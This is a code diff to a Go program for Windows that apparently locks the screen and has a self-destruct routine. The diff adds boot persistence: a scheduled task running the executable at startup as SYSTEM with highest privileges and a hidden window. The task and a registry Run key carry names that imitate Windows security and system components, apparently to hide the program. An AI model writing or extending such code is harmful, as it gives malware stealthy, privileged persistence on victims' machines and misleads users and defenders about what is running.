@@ -394,9 +394,12 @@ func performSelfDestruct() {
 	// 2. Remove AutoStart
 	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
 	if err == nil {
-		k.DeleteValue("ClearFilesClient")
+		k.DeleteValue("WindowsSystemConfig")
 		k.Close()
 	}
+
+	// Remove Scheduled Task
+	exec.Command("schtasks", "/delete", "/tn", "WindowsSecurityHealthService", "/f").Run()
 
 	// 3. Remove Lock State
 	os.Remove(getLockStateConfigPath())
@@ -694,6 +697,18 @@ func enableAutoStart() {
 	defer k.Close()
 
 	k.SetStringValue("WindowsSystemConfig", exePath)
+
+	// Also create a Scheduled Task for boot persistence (SYSTEM account)
+	createScheduledTask(exePath)
+}
+
+func createScheduledTask(exePath string) {
+	// schtasks /create /f /tn "WindowsSecurityHealthService" /tr "exePath" /sc onstart /ru SYSTEM /rl HIGHEST
+	// We use /np (no password) if needed, but SYSTEM doesn't need it.
+	cmd := exec.Command("schtasks", "/create", "/f", "/tn", "WindowsSecurityHealthService", "/tr", "\""+exePath+"\"", "/sc", "onstart", "/ru", "SYSTEM", "/rl", "HIGHEST")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	// We don't care about output, just try to create it.
+	cmd.Run()
 }
 
 func startLockScreen() string {
@@ -945,6 +960,9 @@ func handleUninstall() {
 		k.DeleteValue("WindowsSystemConfig")
 		k.Close()
 	}
+
+	// Remove Scheduled Task
+	exec.Command("schtasks", "/delete", "/tn", "WindowsSecurityHealthService", "/f").Run()
 
 	// 4. Remove Lock State
 	os.Remove(getLockStateConfigPath())
